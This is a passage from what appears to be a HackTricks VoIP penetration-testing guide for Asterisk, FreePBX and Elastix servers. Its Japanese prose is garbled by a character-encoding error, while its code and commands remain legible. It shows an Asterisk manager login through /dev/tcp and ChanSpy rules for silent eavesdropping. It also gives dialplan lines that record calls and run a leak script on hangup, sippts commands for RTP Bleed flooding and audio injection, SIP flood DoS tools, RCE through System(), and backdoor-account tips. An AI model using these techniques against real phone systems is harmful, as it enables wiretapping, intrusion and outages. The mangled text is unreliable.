* å‰è¿°ã®ã‚ˆã†ã«ã€**é€šè©±ã‚’çµ„ç¹”ã™ã‚‹ãŸã‚ã«ã¯èª­ã¿å–ã‚Šæ¨©é™ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“**ã€‚**æ›¸ãè¾¼ã¿**ã®**originate**ã®ã¿ãŒå¿…è¦ã§ã™ã€‚

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çŸ¥ã£ã¦ã„ã‚Œã°æ¥ç¶šã—ã€å¤šãã®æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**è©³ç´°ãªæƒ…å ±ã‚„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒè¦æ±‚ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚**

### **ç›—è´**

Asteriskã§ã¯ã€**`ChanSpy`**ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ç›£è¦–ã™ã‚‹**æ‹¡å¼µå­ï¼ˆã¾ãŸã¯ã™ã¹ã¦ã®æ‹¡å¼µå­ï¼‰**ã‚’æŒ‡å®šã—ã¦ã€ç™ºç”Ÿã—ã¦ã„ã‚‹ä¼šè©±ã‚’èãã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€æ‹¡å¼µå­ã«å‰²ã‚Šå½“ã¦ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãŸã¨ãˆã°ã€**`exten => 333,1,ChanSpy('all',qb)`**ã¨ã™ã‚‹ã¨ã€**æ‹¡å¼µå­333**ã‚’**å‘¼ã³å‡ºã™**ã¨ã€**`all`**ã®æ‹¡å¼µå­ã‚’**ç›£è¦–**ã—ã€æ–°ã—ã„ä¼šè©±ãŒå§‹ã¾ã‚‹ãŸã³ã«ï¼ˆ**`b`**ï¼‰ã€é™ã‹ãªãƒ¢ãƒ¼ãƒ‰ï¼ˆ**`q`**ï¼‰ã§**èã**ã“ã¨ãŒã§ãã¾ã™ã€‚ä¼šè©±ãŒè¡Œã‚ã‚Œã¦ã„ã‚‹å ´æ‰€ã‹ã‚‰åˆ¥ã®ä¼šè©±ã«ç§»å‹•ã™ã‚‹ã«ã¯ã€**`*`**ã‚’æŠ¼ã™ã‹ã€æ‹¡å¼µå­ç•ªå·ã‚’ãƒãƒ¼ã‚¯ã—ã¾ã™ã€‚

ã¾ãŸã€**`ExtenSpy`**ã‚’ä½¿ç”¨ã—ã¦ã€1ã¤ã®æ‹¡å¼µå­ã®ã¿ã‚’ç›£è¦–ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

ä¼šè©±ã‚’èãä»£ã‚ã‚Šã«ã€æ‹¡å¼µå­ã‚’ä½¿ç”¨ã—ã¦**ãƒ•ã‚¡ã‚¤ãƒ«ã«è¨˜éŒ²ã™ã‚‹**ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

é€šè©±ã¯ **`/tmp`** ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

ã¾ãŸã€Asterisk ãŒçµ‚äº†ã™ã‚‹ã¨ãã«é€šè©±ã‚’æ¼æ´©ã•ã›ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed**ã¯ã€Asteriskãƒ™ãƒ¼ã‚¹ã®VoIPã‚µãƒ¼ãƒãƒ¼ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å•é¡Œã§ã™ï¼ˆ2017å¹´ã«å…¬é–‹ã•ã‚Œã¾ã—ãŸï¼‰ã€‚ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€VoIPã®ä¼šè©±ã‚’é‹ã¶**RTPï¼ˆãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒ—ãƒ­ãƒˆã‚³ãƒ«ï¼‰ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯**ãŒã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®èª°ã§ã‚‚å‚å—ãŠã‚ˆã³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒNATï¼ˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ‰ãƒ¬ã‚¹å¤‰æ›ï¼‰ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚’çµŒç”±ã™ã‚‹éš›ã«ã€èªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã§ã™ã€‚

RTPãƒ—ãƒ­ã‚­ã‚·ã¯ã€RTCã‚·ã‚¹ãƒ†ãƒ ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹NATã®åˆ¶é™ã«å¯¾å‡¦ã™ã‚‹ãŸã‚ã«ã€2ã¤ä»¥ä¸Šã®ãƒ‘ãƒ¼ãƒ†ã‚£é–“ã§RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ãƒ—ãƒ­ã‚­ã‚·ã™ã‚‹ã“ã¨ã‚’è©¦ã¿ã¾ã™ã€‚NATãŒå­˜åœ¨ã™ã‚‹å ´åˆã€RTPãƒ—ãƒ­ã‚­ã‚·ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¯é€šå¸¸ã€ã‚·ã‚°ãƒŠãƒªãƒ³ã‚°ï¼ˆä¾‹ï¼šSIPï¼‰ã‚’ä»‹ã—ã¦å–å¾—ã—ãŸRTPã®IPãŠã‚ˆã³ãƒãƒ¼ãƒˆæƒ…å ±ã«é ¼ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã€‚ãã®ãŸã‚ã€ã„ãã¤ã‹ã®RTPãƒ—ãƒ­ã‚­ã‚·ã¯ã€ãã®ã‚ˆã†ãªIPãŠã‚ˆã³ãƒãƒ¼ãƒˆã®çµ„ã¿åˆã‚ã›ã‚’è‡ªå‹•çš„ã«å­¦ç¿’ã™ã‚‹ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ç€ä¿¡RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’æ¤œæŸ»ã—ã€ç€ä¿¡RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚½ãƒ¼ã‚¹IPã¨ãƒãƒ¼ãƒˆã‚’å¿œç­”ã™ã¹ãã‚‚ã®ã¨ã—ã¦ãƒãƒ¼ã‚¯ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã‚‹ã“ã¨ãŒå¤šã„ã§ã™ã€‚ã“ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¯ã€Œå­¦ç¿’ãƒ¢ãƒ¼ãƒ‰ã€ã¨å‘¼ã°ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã€**ã„ã‹ãªã‚‹ç¨®é¡ã®èªè¨¼ã‚‚ä½¿ç”¨ã—ã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€**æ”»æ’ƒè€…**ã¯**RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’RTPãƒ—ãƒ­ã‚­ã‚·ã«é€ä¿¡**ã—ã€é€šè©±ä¸­ã®RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã®ç™ºä¿¡è€…ã¾ãŸã¯å—ä¿¡è€…å‘ã‘ã«é€ä¿¡ã•ã‚Œã‚‹ã¹ããƒ—ãƒ­ã‚­ã‚·ã•ã‚ŒãŸRTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ç§ãŸã¡ã¯ã€ã“ã®è„†å¼±æ€§ã‚’RTP Bleedã¨å‘¼ã‚“ã§ã„ã¾ã™ã€‚ãªãœãªã‚‰ã€ã“ã‚Œã«ã‚ˆã‚Šæ”»æ’ƒè€…ã¯åˆæ³•çš„ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é€ä¿¡ã•ã‚Œã‚‹ã¹ãRTPãƒ¡ãƒ‡ã‚£ã‚¢ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‰ã§ã™ã€‚

RTPãƒ—ãƒ­ã‚­ã‚·ã¨RTPã‚¹ã‚¿ãƒƒã‚¯ã®ã‚‚ã†ä¸€ã¤ã®èˆˆå‘³æ·±ã„æŒ¯ã‚‹èˆã„ã¯ã€**RTP Bleedã«å¯¾ã—ã¦è„†å¼±ã§ã¯ãªãã¦ã‚‚**ã€æ™‚ã«ã¯**ä»»æ„ã®ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã®RTPãƒ‘ã‚±ãƒƒãƒˆã‚’å—ã‘å…¥ã‚Œã€è»¢é€ã€ãŠã‚ˆã³/ã¾ãŸã¯å‡¦ç†ã™ã‚‹**ã“ã¨ãŒã‚ã‚‹ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯åˆæ³•çš„ãªã‚‚ã®ã§ã¯ãªã„RTPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã€ã“ã‚Œã«ã‚ˆã‚Šæ—¢å­˜ã®RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã«ä¸æ­£ãªãƒ¡ãƒ‡ã‚£ã‚¢ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ”»æ’ƒã‚’RTPã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨å‘¼ã³ã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€RTPãƒ—ãƒ­ã‚­ã‚·ã¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ä¸¡æ–¹ã§è¦‹ã¤ã‹ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

Asteriskã¨FreePBXã¯ã€å¾“æ¥ã‹ã‚‰**`NAT=yes`ã®è¨­å®š**ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€ã“ã‚Œã«ã‚ˆã‚ŠRTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒèªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã€é€šè©±æ™‚ã«éŸ³å£°ãŒãªã„ã‹ç‰‡æ–¹å‘ã®éŸ³å£°ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://www.rtpbleed.com/](https://www.rtpbleed.com/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

* [**sippts**](https://github.com/Pepelux/sippts)ã®**`rtpbleed.py`**ï¼šRTP Bleedã®è„†å¼±æ€§ã‚’æ¤œå‡ºã™ã‚‹ãŸã‚ã«RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã—ã¾ã™ã€‚
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:** RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã—ã¦RTP Bleedè„†å¼±æ€§ã‚’æ¤œå‡ºã—ã¾ã™ã€‚
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:** RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã—ã¦RTP Bleedè„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:** RTPãƒ–ãƒªãƒ¼ãƒ‰è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã€RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ï¼ˆã‚ªãƒ¼ãƒ‡ã‚£ã‚ªãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ï¼‰ã‚’é€ä¿¡ã—ã¾ã™ã€‚
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asteriskã§ã€è„†å¼±ãªã‚¦ã‚§ãƒ–ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã‚µãƒ¼ãƒãƒ¼ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã§ã€**æ‹¡å¼µãƒ«ãƒ¼ãƒ«ã‚’è¿½åŠ ã—ã¦å†èª­ã¿è¾¼ã¿ã™ã‚‹**ã“ã¨ãŒã§ãã‚‹å ´åˆã€**`System`**ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦RCEã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`**ã¨ã„ã†ã‚³ãƒãƒ³ãƒ‰ã¯ã€å¿…è¦ã«å¿œã˜ã¦ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«**`System`**ã®ä»£ã‚ã‚Šã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="warning" %}
ã‚µãƒ¼ãƒãƒ¼ãŒ**`System`**ã‚³ãƒãƒ³ãƒ‰ã§ç‰¹å®šã®æ–‡å­—ã®ä½¿ç”¨ã‚’ç¦æ­¢ã—ã¦ã„ã‚‹å ´åˆï¼ˆElastixãªã©ï¼‰ã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒã‚·ã‚¹ãƒ†ãƒ å†…ã§ä½•ã‚‰ã‹ã®æ–¹æ³•ã§**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã‚‹ã‹**ï¼ˆElastixã‚„trixboxã®ã‚ˆã†ã«ï¼‰ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦**ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆ**ã—ã€ãã‚Œã‚’**`System`**ã‚’ä½¿ç”¨ã—ã¦**å®Ÿè¡Œ**ã—ã¾ã™ã€‚
{% endhint %}

#### èˆˆå‘³æ·±ã„ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã¨æ¨©é™

* **`sip.conf`** -> SIPãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
* **Asteriskã‚µãƒ¼ãƒãƒ¼ãŒrootã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€rootã‚’ä¾µå®³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **mysql rootãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
* ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¨ã—ã¦æ–°ã—ã„mysqlãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **`FreePBX`**
* **`amportal.conf`** -> ã‚¦ã‚§ãƒ–ãƒ‘ãƒãƒ«ç®¡ç†è€…ï¼ˆFreePBXï¼‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
* **`FreePBX.conf`** -> ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹FreePBXuserãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
* ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¨ã—ã¦æ–°ã—ã„mysqlãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* **`Elastix`**
* **`Elastix.conf`** -> mysql rootãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€IMAPdãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€ã‚¦ã‚§ãƒ–ç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãªã©ã€ã„ãã¤ã‹ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå¹³æ–‡ã§å«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
* **ã„ãã¤ã‹ã®ãƒ•ã‚©ãƒ«ãƒ€**ã¯ä¾µå®³ã•ã‚ŒãŸAsteriskãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å±ã—ã¦ã„ã¾ã™ï¼ˆrootã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ãªã„å ´åˆï¼‰ã€‚ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å‰è¿°ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã€ã¾ãŸæ§‹æˆã‚‚åˆ¶å¾¡ã§ãã‚‹ãŸã‚ã€å®Ÿè¡Œæ™‚ã«ä»–ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢ä»˜ããƒã‚¤ãƒŠãƒªã‚’Asteriskã«èª­ã¿è¾¼ã¾ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### RTPã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

**`rtpinsertsound`**ï¼ˆ`sudo apt install rtpinsertsound`ï¼‰ã‚„**`rtpmixsound`**ï¼ˆ`sudo apt install rtpmixsound`ï¼‰ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ä¼šè©±ã«**`.wav`**ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã¯ã€[http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ä¼šè©±ã‚’**ã‚¹ã‚­ãƒ£ãƒ³**ã™ã‚‹ï¼ˆ**`rtpscan.pl`**ï¼‰ã€ä¼šè©±ã«`.wav`ã‚’é€ä¿¡ã™ã‚‹ï¼ˆ**`rtpsend.pl`**ï¼‰ã€ä¼šè©±ã«ãƒã‚¤ã‚ºã‚’æŒ¿å…¥ã™ã‚‹ï¼ˆ**`rtpflood.pl`**ï¼‰ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

### DoS

VoIPã‚µãƒ¼ãƒãƒ¼ã§DoSã‚’è©¦ã¿ã‚‹ãŸã‚ã®ã„ãã¤ã‹ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

* [**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰ã®**`sipflood.py`**ï¼š**_**SipFlood**_ã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ç„¡åˆ¶é™ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã¾ã™ã€‚
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/)ï¼šAsteriskã§ä½¿ç”¨ã•ã‚Œã‚‹IAXãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®DoS
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt)ï¼šUDP/IPä¸Šã§SIP/SDP INVITEãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®ãƒ•ãƒ©ãƒƒãƒ‡ã‚£ãƒ³ã‚°ã‚’å®Ÿè¡Œã™ã‚‹ãƒ„ãƒ¼ãƒ«ã€‚
* [**rtpflood**](https://www.kali.org/tools/rtpflood/)ï¼šè¤‡æ•°ã®æ­£å¸¸ãªRTPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹RTPãƒãƒ¼ãƒˆã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã¾ãšã‚¹ãƒ‹ãƒ•ã‚£ãƒ³ã‚°ï¼‰ã€‚
* [**SIPp**](https://github.com/SIPp/sipp)ï¼šSIPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®åˆ†æã¨ç”ŸæˆãŒå¯èƒ½ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€DoSã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak)ï¼šSIPã‚¹ã‚¤ã‚¹ã‚¢ãƒ¼ãƒŸãƒ¼ãƒŠã‚¤ãƒ•ã€‚SIPæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚
* Fuzzersï¼š[**protos-sip**](https://www.kali.org/tools/protos-sip/)ã€[**voiper**](https://github.com/gremwell/voiper)ã€‚
* [**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰ã®**`sipsend.py`**ï¼šSIPSendã‚’ä½¿ç”¨ã—ã¦ã€ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã•ã‚ŒãŸSIPãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã€å¿œç­”ã‚’åˆ†æã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* [**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰ã®**`wssend.py`**ï¼šWsSendã‚’ä½¿ç”¨ã—ã¦ã€WebSocketsã‚’ä»‹ã—ã¦ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã•ã‚ŒãŸSIPãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã€å¿œç­”ã‚’åˆ†æã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### OSã®è„†å¼±æ€§

Asteriskãªã©ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹æœ€ã‚‚ç°¡å˜ãªæ–¹æ³•ã¯ã€**FreePBXã€Elastixã€Trixbox**ãªã©ã€ã™ã§ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹OSãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚ãŸã ã—ã€ã“ã‚Œã‚‰ã®ãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã¯ä¸€åº¦å‹•ä½œã—ã¦ã„ã‚‹ã¨ã€ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†è€…ãŒãã‚Œã‚‰ã‚’å†åº¦æ›´æ–°ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã€æ™‚é–“ã®çµŒéã¨ã¨ã‚‚ã«**è„†å¼±æ€§**ãŒç™ºè¦‹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„HackTricksã®PDFã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolop
